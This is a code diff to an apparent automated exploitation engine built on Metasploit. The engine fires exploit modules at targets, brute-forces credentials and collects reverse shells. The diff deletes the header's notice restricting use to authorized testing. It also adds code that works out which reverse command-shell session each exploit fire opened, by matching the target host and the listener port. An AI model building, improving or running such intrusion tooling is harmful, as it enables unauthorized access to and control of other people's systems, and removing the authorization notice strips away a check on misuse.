@@ -12,12 +12,6 @@
 #             CVE, product, auxiliary, and curated unauthenticated tiers; the fire
 #             path; the credential brute; and the auxiliary run path that records
 #             proven unauthenticated access.
-#
-# SECURITY NOTICE
-#             This software is intended for authorized security assessment and
-#             defensive operations only. Use it exclusively on systems you own or
-#             are explicitly permitted to test. Unauthorized use may violate law.
-#
 # DISCLAIMER
 #             This software is provided "as is" without warranty of any kind. The
 #             author and Red Cell Security LLC accept no liability for damage or
@@ -682,6 +676,12 @@ class MsfClient:
                                    f"LPORT={lport} @ {rhost}")
             logger.info("fire %s @ %s:%s payload=%s LHOST=%s LPORT=%s",
                         candidate.module, rhost, port, payload_name, lhost, lport)
+            # snapshot sessions present before we fire so the matcher can tell a
+            # session THIS fire opened from one already running (concurrent fires).
+            try:
+                before_sids = set(self._client.sessions.list.keys())
+            except Exception:
+                before_sids = set()
             result = exploit.execute(payload=payload)
             if not isinstance(result, dict) or not result.get("uuid"):
                 err = ""
@@ -695,7 +695,9 @@ class MsfClient:
                                      err or "execute returned no uuid")
             uuid = result.get("uuid")
             job_id = result.get("job_id")
-            matched = self._await_session(uuid, self.cfg.exploit_timeout)
+            matched = self._await_session(uuid, self.cfg.exploit_timeout,
+                                          rhost=rhost, lport=lport,
+                                          before=before_sids)
             if matched is None:
                 logger.info("fire %s @ %s -> no session", candidate.module, rhost)
                 return None, "no_session", "fired, no session within timeout"
@@ -746,16 +748,41 @@ class MsfClient:
             fails += _apply_options(exploit, [(opt, val)])
         return fails
 
-    def _await_session(self, uuid, timeout):
+    def _await_session(self, uuid, timeout, rhost=None, lport=None, before=None):
+        """Wait for the session this fire opened. MSF only tags meterpreter sessions
+        with exploit_uuid; a command-shell reverse payload opens a session with no
+        uuid link, so uuid-only matching misses exactly the shells this engine
+        prefers. Correlate in order of certainty: (1) exact exploit_uuid, (2) a
+        session NEW since this fire whose target host matches rhost and whose handler
+        LPORT matches the one we assigned (the per-fire unique LPORT disambiguates
+        concurrent fires), (3) a session new since this fire whose target host matches
+        rhost. Returns (sid, sdict) or None."""
+        before = before or set()
+        want_lport = str(lport) if lport is not None else None
         start = time.time()
         while time.time() - start < timeout:
             try:
                 sessions = self._client.sessions.list
             except Exception:
                 sessions = {}
-            for sid, s in sessions.items():
-                if s.get("exploit_uuid") == uuid:
-                    return sid, s
+            # (1) exact uuid
+            for sid, sdict in sessions.items():
+                if uuid and sdict.get("exploit_uuid") == uuid:
+                    return sid, sdict
+            # (2) new session, target matches rhost, handler LPORT matches
+            # (3) new session, target matches rhost
+            host_only = None
+            for sid, sdict in sessions.items():
+                if sid in before:
+                    continue
+                if not _session_targets_host(sdict, rhost):
+                    continue
+                if want_lport and _session_lport(sdict) == want_lport:
+                    return sid, sdict
+                if host_only is None:
+                    host_only = (sid, sdict)
+            if host_only is not None:
+                return host_only
             time.sleep(1.0)
         return None
 
@@ -1131,6 +1158,31 @@ def _apply_options(mod, pairs):
         except Exception as e:
             failures.append((key, val, str(e)))
     return failures
+
+
+def _session_targets_host(sdict, rhost):
+    """True if a session's recorded peer/target matches rhost. MSF exposes the
+    target variously as session_host, target_host, or the ip half of tunnel_peer
+    (ip:port), so all are checked."""
+    if not rhost:
+        return False
+    for key in ("session_host", "target_host"):
+        if str(sdict.get(key) or "") == rhost:
+            return True
+    peer = str(sdict.get("tunnel_peer") or "")
+    if peer:
+        # tunnel_peer is the TARGET side for a reverse session (ip:port)
+        return peer.rsplit(":", 1)[0] == rhost
+    return False
+
+
+def _session_lport(sdict):
+    """The handler LPORT a session came back on, from tunnel_local (ip:port) if
+    present, as a string. Empty when unavailable."""
+    local = str(sdict.get("tunnel_local") or "")
+    if ":" in local:
+        return local.rsplit(":", 1)[-1]
+    return ""
 
 
 def _lhost_for(target):
